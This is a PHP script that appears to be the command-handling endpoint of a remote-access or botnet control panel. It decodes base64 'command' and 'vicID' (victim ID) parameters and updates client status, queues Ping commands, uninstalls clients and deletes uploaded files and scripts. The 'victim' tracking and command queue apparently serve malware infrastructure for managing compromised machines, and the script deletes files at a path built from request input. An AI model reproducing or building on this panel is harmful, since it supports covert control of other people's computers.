<?php
include 'classes/Database.php';
include 'classes/Clients.php';
$client = new Clients;
$_GET = filter_input_array(INPUT_GET, FILTER_SANITIZE_STRING);
$command = base64_decode($_GET['command']);
$ID = "'".base64_decode($_GET['vicID'])."'";

$A = explode("|BN|", sanitizeInput($command));

switch ($A[0]) {
	case "Uninstall":
          $client->removeClient($ID);
          delete_files("upload/" . $ID);          
		break;

	case "CleanCommands":
          $client->updateCommands($ID,"Ping");
		break;
		
	case "Offline":
          $client->updateStatus($ID,"Offline");
		break;

	case "Online":
		  $client->updateStatus($ID,"Online");
		break;
		
	case 'Ping':
		$client->updateCommands($ID,"Ping");
		break;

	case 'DeleteScript':
		 try {
		 	unlink("scripts/" . $A[1]);
		 } catch (Exception $e) {
		 	
		 }
		break;

	default:
		break;
}

function delete_files($target) {
	try {
	    if(is_dir($target)){
	        $files = glob($target . '*', GLOB_MARK);
	        foreach($files as $file){
	            delete_files($file);      
	        }
	        rmdir($target);
	    } elseif(is_file($target)) {
	        unlink($target);  
	    }
	} catch (Exception $e) {
		
	}
}

function sanitizeInput($value){
   $data = trim($value);
   $data = strip_tags($data);
   $data = htmlentities($data);
   $data = htmlspecialchars($data,ENT_QUOTES,'UTF-8');
   $data = filter_var($data,FILTER_SANITIZE_STRING);
   return $data;
}
?>